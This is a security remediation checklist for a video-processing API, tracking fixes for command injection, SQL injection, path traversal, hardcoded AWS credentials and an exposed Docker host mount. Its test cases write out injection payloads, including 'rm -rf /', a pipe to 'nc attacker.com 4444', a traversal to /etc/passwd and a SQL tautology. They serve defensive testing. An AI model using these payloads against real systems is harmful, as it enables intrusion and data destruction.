# VOILIA Security Remediation Checklist

Use this checklist to track security fixes across the CRITICAL, HIGH, and MEDIUM severity issues.

---

## CRITICAL ISSUES (Must Fix Before Deployment)

### Critical #1: Command Injection via os.system()
**File**: `tests/agent-tests/video_processor.py` line 26-28

- [ ] Remove `os.system()` call
- [ ] Replace with `subprocess.run()` using argument list
- [ ] Validate video_url format (scheme, netloc)
- [ ] Validate output_name (extension, length)
- [ ] Add timeout protection
- [ ] Add error handling
- [ ] Test with injection payloads
- [ ] Verify fix with security scan

**Test Cases**:
```bash
# Should FAIL before fix:
curl -X POST "http://localhost:8000/render?video_url=http://example.com;rm%20-rf%20/&output_name=test"

# Should PASS after fix:
curl -X POST "http://localhost:8000/render?video_url=https://example.com/video.mp4&output_name=output.mp4"
curl -X POST "http://localhost:8000/render?video_url=http://example.com;rm&output_name=test" # Should reject
```

---

### Critical #2: Unsafe subprocess.run with shell=True
**File**: `tests/agent-tests/video_processor.py` line 80-90

- [ ] Remove `shell=True` parameter
- [ ] Replace with argument list
- [ ] Whitelist allowed effects (use enum)
- [ ] Validate input_file path
- [ ] Add error handling
- [ ] Remove AWS key from logs
- [ ] Test command injection attempts
- [ ] Verify no shell metacharacters allowed

**Test Cases**:
```bash
# Test allowed effect (should pass):
curl -X POST "http://localhost:8000/effects?input=video.mp4&effect=scale_hd"

# Test injection attempt (should fail):
curl -X POST "http://localhost:8000/effects?input=video.mp4&effect=scale|nc+attacker.com+4444"
```

---

### Critical #3: Hardcoded AWS Credentials
**File**: `tests/agent-tests/video_processor.py` line 10-13

- [ ] Delete hardcoded AWS keys from code
- [ ] Load AWS_ACCESS_KEY_ID from environment
- [ ] Load AWS_SECRET_ACCESS_KEY from environment
- [ ] Load DATABASE_URL from environment
- [ ] Add validation for required environment variables
- [ ] Add startup check (fail if credentials missing)
- [ ] Update .gitignore to exclude .env files
- [ ] Check Git history for leaked credentials

**Verification**:
```bash
# Verify no credentials in code:
grep -r "AKIA\|wJalr\|password123" /root/uplevelia/projects/voilia --include="*.py"

# Should return no results
# Should return: No matches

# Check .gitignore:
cat /root/uplevelia/projects/voilia/.gitignore | grep ".env"
# Should show: .env
```

---

### Critical #4: Hardcoded Credentials in docker-compose.yml
**File**: `tests/agent-tests/docker-compose.yml` lines 9-10, 21, 30-31

- [ ] Remove DATABASE_URL from environment section
- [ ] Remove AWS_SECRET_KEY from environment section
- [ ] Remove POSTGRES_PASSWORD from environment section
- [ ] Add `env_file: .env` to services
- [ ] Create .env file template (.env.example)
- [ ] Document required environment variables
- [ ] Bind postgres to localhost only (127.0.0.1:5432)
- [ ] Bind redis to localhost only (127.0.0.1:6379)
- [ ] Remove /:/host_root mount (line 23)
- [ ] Add health checks to services

**Updated docker-compose.yml**:
```yaml
services:
  voilia-api:
    environment:
      - DATABASE_URL  # Loaded from .env
      - AWS_ACCESS_KEY_ID  # Loaded from .env
    env_file: .env
    
  postgres:
    ports:
      - "127.0.0.1:5432:5432"  # Localhost only!
    
  redis:
    ports:
      - "127.0.0.1:6379:6379"  # Localhost only!

# REMOVE this dangerous mount:
voilia-worker:
  volumes:
    - /:/host_root  # DELETE THIS LINE
```

---

### Critical #5: Path Traversal in File Upload
**File**: `tests/agent-tests/video_processor.py` line 36-57

- [ ] Remove direct use of user-supplied filename
- [ ] Generate unique job ID for each upload
- [ ] Create isolated directory per job
- [ ] Use safe filename (no user input)
- [ ] Validate file extension against whitelist
- [ ] Validate output path doesn't escape base directory
- [ ] Add file size limit (500MB)
- [ ] Use Path.resolve().relative_to() for validation
- [ ] Add cleanup on error (try/finally)
- [ ] Set restrictive file permissions (0o600)

**Test Cases**:
```bash
# Should FAIL before fix (path traversal):
curl -X POST -F "file=@video.mp4" \
  -F "output_name=../../../../etc/passwd" \
  http://localhost:8000/upload

# Should PASS after fix:
curl -X POST -F "file=@video.mp4" \
  http://localhost:8000/upload
# Returns: job_id with isolated directory

# Should FAIL after fix (traversal attempt rejected):
curl -X POST -F "output_name=../../../evil" \
  http://localhost:8000/upload
# Returns: 400 Path traversal detected
```

---

### Critical #6: SQL Injection in Database Query
**File**: `tests/agent-tests/video_processor.py` line 60-77

- [ ] Remove string concatenation from SQL queries
- [ ] Use parameterized queries (prepared statements)
- [ ] Validate job_id format (UUID) before querying
- [ ] Implement ORM layer (SQLAlchemy recommended)
- [ ] Use named parameters or positional parameters
- [ ] Remove direct string formatting in SQL
- [ ] Add database access control (limit permissions)
- [ ] Test with SQL injection payloads

**Test Cases**:
```bash
# Should FAIL before fix (SQL injection):
curl "http://localhost:8000/download?job_id=1' OR '1'='1"

# Should PASS after fix:
curl "http://localhost:8000/download?job_id=550e8400-e29b-41d4-a716-446655440000"

# Should FAIL after fix (invalid format):
curl "http://localhost:8000/download?job_id=1' OR '1'='1"
# Returns: 400 Invalid job ID format
```

---

### Critical #7: Dangerous cleanup_temp_files Function
**File**: `tests/agent-tests/video_processor.py` line 96-103

- [ ] Replace `os.system("rm -rf ...")` with Python shutil
- [ ] Validate path is within allowed base directory
- [ ] Calculate cleanup size before deletion
- [ ] Add maximum size limit for cleanup
- [ ] Use shutil.rmtree() instead of shell command
- [ ] Implement with try/finally for safety
- [ ] Add logging for cleanup operations
- [ ] Consider context managers for auto-cleanup

**Safe Implementation**:
```python
# REMOVE dangerous:
os.system(f"rm -rf {directory}")

# REPLACE with safe:
import shutil
from pathlib import Path

def cleanup_temp_files_secure(directory: str):
    path = Path(directory)
    # Validate path is within allowed base
    path.resolve().relative_to(Path("/tmp/voilia-renders").resolve())
    # Use Python, not shell
    shutil.rmtree(path)
```

---

### Critical #8: Exposed Filesystem Mount in Docker
**File**: `tests/agent-tests/docker-compose.yml` line 23

- [ ] Remove `- /:/host_root` volume mount completely
- [ ] Replace with specific job directory mount
- [ ] Use read-only mounts where applicable
- [ ] Implement security_opt: no-new-privileges
- [ ] Add resource limits (CPU, memory)
- [ ] Set up network isolation

**Fix**:
```yaml
# REMOVE:
volumes:
  - /:/host_root

# REPLACE with:
volumes:
  - /tmp/voilia-renders:/tmp/voilia-renders:rw
security_opt:
  - no-new-privileges:true
deploy:
  resources:
    limits:
      cpus: '2'
      memory: 2G
```

---

## HIGH SEVERITY ISSUES (Should Fix Within Sprint)

### High #1: Missing Authentication/Authorization
**Files**: `tests/agent-tests/video_processor.py` and `sample_api.py` (all endpoints)

- [ ] Implement JWT token verification
- [ ] Add @requires_auth decorator to all endpoints
- [ ] Create login endpoint for token generation
- [ ] Add role-based access control (RBAC)
- [ ] Implement user_id association with jobs
- [ ] Add authorization checks (user owns job)
- [ ] Store user_id with each render job
- [ ] Test unauthorized access rejection
- [ ] Test cross-user access prevention

**Implementation Checklist**:
```python
# Add to each endpoint:
@app.post("/render")
async def render(
    request: RenderRequest,
    current_user: User = Depends(verify_token)
):
    job.user_id = current_user.user_id  # Associate with user
```

- [ ] Create /auth/login endpoint
- [ ] Implement token expiration (24 hours)
- [ ] Add token refresh mechanism
- [ ] Test with valid/invalid tokens
- [ ] Verify 401 on missing token
- [ ] Verify 403 on unauthorized user

---

### High #2: Missing File Type Validation
**File**: `tests/agent-tests/video_processor.py` line 36-57

- [ ] Validate file extension (.mp4, .mov, .avi, .mkv only)
- [ ] Validate MIME type using magic numbers
- [ ] Reject executable files (.sh, .exe, .bin)
- [ ] Reject archives (.zip, .tar, .rar)
- [ ] Implement magic library for content detection
- [ ] Test with various file types
- [ ] Test with crafted headers

**Code Addition**:
```python
ALLOWED_EXTENSIONS = {".mp4", ".mov", ".avi", ".mkv"}
ALLOWED_MIMETYPES = {"video/mp4", "video/quicktime", "video/x-msvideo"}

# Validate extension
ext = Path(file.filename).suffix.lower()
if ext not in ALLOWED_EXTENSIONS:
    raise HTTPException(400, "Invalid extension")

# Validate MIME type
import magic
header = await file.read(512)
mime = magic.from_buffer(header, mime=True)
if mime not in ALLOWED_MIMETYPES:
    raise HTTPException(400, "Invalid MIME type")
```

---

### High #3: No File Size Limits
**File**: `tests/agent-tests/video_processor.py` line 36-57

- [ ] Define MAX_UPLOAD_SIZE constant (500MB recommended)
- [ ] Check size while reading (not after)
- [ ] Delete partial files on size violation
- [ ] Return 413 (Payload Too Large) on violation
- [ ] Add size limit to FastAPI
- [ ] Test with oversized files
- [ ] Verify partial file cleanup

**Code Addition**:
```python
MAX_UPLOAD_SIZE = 500 * 1024 * 1024

total_size = 0
while chunk := await file.read(8192):
    total_size += len(chunk)
    if total_size > MAX_UPLOAD_SIZE:
        file_path.unlink()  # Delete partial file
        raise HTTPException(413, "File too large")
    f.write(chunk)
```

---

### High #4: Sensitive Data Exposure in Logs
**File**: `tests/agent-tests/video_processor.py` line 92-93

- [ ] Remove print() statements with AWS keys
- [ ] Never log credentials or secrets
- [ ] Use structured logging (logging module)
- [ ] Redact sensitive values from logs
- [ ] Configure log level appropriately
- [ ] Use log aggregation with PII filtering

**Safe Logging**:
```python
# REMOVE:
print(f"Processing with AWS key: {AWS_SECRET_KEY}")

# REPLACE with:
import logging
logger = logging.getLogger(__name__)
logger.info(f"Processing started")  # No credentials
```

---

### High #5: Insecure Docker Configuration
**File**: `tests/agent-tests/docker-compose.yml`

- [ ] Bind database ports to localhost only
- [ ] Bind redis ports to localhost only
- [ ] Add security_opt: no-new-privileges
- [ ] Add resource limits
- [ ] Remove privileged mode
- [ ] Add read-only root filesystem where possible
- [ ] Use alpine base images
- [ ] Scan image for vulnerabilities

**Verification**:
```bash
# Check port bindings:
docker-compose ps
# Should show: 127.0.0.1:5432 (not 0.0.0.0:5432)

# Scan image:
docker scan voilia-api
```

---

## MEDIUM SEVERITY ISSUES (Next Release)

### Medium #1: Missing Input Validation on URL
**File**: `tests/agent-tests/video_processor.py` line 16-28

- [ ] Validate URL scheme (http, https only)
- [ ] Validate domain format
- [ ] Block internal IPs (SSRF prevention)
- [ ] Block localhost and 127.0.0.1
- [ ] Block private IP ranges (10.0.0.0/8, etc)
- [ ] Validate URL length
- [ ] Test with malicious URLs

**Code Addition**:
```python
from urllib.parse import urlparse
import ipaddress

ALLOWED_SCHEMES = {"http", "https"}
BLOCKED_IPS = {
    "127.0.0.1", "localhost",
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
}

parsed = urlparse(video_url)
if parsed.scheme not in ALLOWED_SCHEMES:
    raise HTTPException(400, "Invalid URL scheme")
# ... more validation
```

---

### Medium #2: Missing Job Timeout Configuration
**File**: `tests/agent-tests/video_processor.py` (all subprocess calls)

- [ ] Add timeout to subprocess.run()
- [ ] Set timeout to 600 seconds (10 minutes)
- [ ] Catch subprocess.TimeoutExpired
- [ ] Return 408 (Request Timeout) on timeout
- [ ] Test timeout behavior
- [ ] Add timeout config option

**Code Addition**:
```python
try:
    subprocess.run(command, timeout=600, check=True)
except subprocess.TimeoutExpired:
    raise HTTPException(408, "Encoding timeout")
```

---

### Medium #3: Missing Temporary File Cleanup on Error
**File**: `tests/agent-tests/video_processor.py` (all endpoints)

- [ ] Add try/finally blocks to all file operations
- [ ] Use context managers for auto-cleanup
- [ ] Implement cleanup function
- [ ] Test error cleanup
- [ ] Add cleanup on timeout
- [ ] Log cleanup operations

**Code Pattern**:
```python
try:
    # Process video...
    result = encode_video(input_path)
finally:
    # Always cleanup
    if job_dir.exists():
        shutil.rmtree(job_dir)
```

---

## SECURITY VERIFICATION TESTS

### Before Marking Issues as Fixed

Run these commands to verify fixes:

```bash
# 1. Static analysis
bandit -r /root/uplevelia/projects/voilia/tests/agent-tests --format json

# 2. Secret detection
pip install detect-secrets
detect-secrets scan /root/uplevelia/projects/voilia

# 3. Check for dangerous patterns
grep -r "os.system\|shell=True\|password\|AWS_SECRET" \
  /root/uplevelia/projects/voilia --include="*.py" --include="*.yml"

# 4. Docker image scan
docker build -t voilia-test .
docker scan voilia-test

# 5. Dependency audit
pip-audit
```

### Functional Security Tests

```python
# tests/test_security.py

import pytest
from httpx import AsyncClient

@pytest.mark.asyncio
async def test_no_command_injection():
    """Verify command injection is prevented"""
    async with AsyncClient(app=app) as client:
        # This should NOT execute rm -rf
        response = await client.post("/render", json={
            "video_url": "http://example.com;rm -rf /",
            "output_name": "test.mp4"
        })
        assert response.status_code != 200  # Should be rejected

@pytest.mark.asyncio
async def test_path_traversal_blocked():
    """Verify path traversal is prevented"""
    async with AsyncClient(app=app) as client:
        response = await client.post("/upload", data={
            "output_name": "../../../../etc/passwd"
        })
        assert response.status_code == 400

@pytest.mark.asyncio
async def test_no_hardcoded_credentials():
    """Verify no hardcoded credentials in code"""
    import os
    assert os.getenv("AWS_SECRET_KEY") is not None
    assert os.getenv("DATABASE_URL") is not None

@pytest.mark.asyncio
async def test_authentication_required():
    """Verify unauthenticated requests are rejected"""
    async with AsyncClient(app=app) as client:
        response = await client.post("/render", json={
            "video_url": "https://example.com/video.mp4",
            "output_name": "test.mp4"
        })
        # Should require authentication
        assert response.status_code in [401, 403]
```

---

## Remediation Tracking

### Sprint 1 (Week 1) - CRITICAL FIXES
- [ ] CRITICAL #1 - Command injection via os.system()
- [ ] CRITICAL #2 - Unsafe subprocess.run with shell=True
- [ ] CRITICAL #3 - Hardcoded AWS credentials
- [ ] CRITICAL #4 - Hardcoded docker-compose credentials
- [ ] CRITICAL #5 - Path traversal in file upload
- [ ] CRITICAL #6 - SQL injection
- [ ] CRITICAL #7 - Dangerous cleanup function
- [ ] CRITICAL #8 - Exposed filesystem mount

**Status**: [ ] Not Started [ ] In Progress [ ] Complete

### Sprint 2 (Week 2) - HIGH PRIORITY
- [ ] HIGH #1 - Missing authentication
- [ ] HIGH #2 - Missing file type validation
- [ ] HIGH #3 - No file size limits
- [ ] HIGH #4 - Sensitive data in logs
- [ ] HIGH #5 - Insecure Docker config

**Status**: [ ] Not Started [ ] In Progress [ ] Complete

### Sprint 3 (Week 3) - MEDIUM PRIORITY
- [ ] MEDIUM #1 - URL input validation
- [ ] MEDIUM #2 - Job timeout
- [ ] MEDIUM #3 - Error cleanup

**Status**: [ ] Not Started [ ] In Progress [ ] Complete

---

## Sign-Off

- [ ] All CRITICAL issues fixed and tested
- [ ] All HIGH issues addressed
- [ ] All MEDIUM issues resolved
- [ ] Security tests passing
- [ ] Penetration testing completed
- [ ] Security team approval obtained

**Date Completed**: _______________  
**Approved By**: _______________  
**Notes**: 

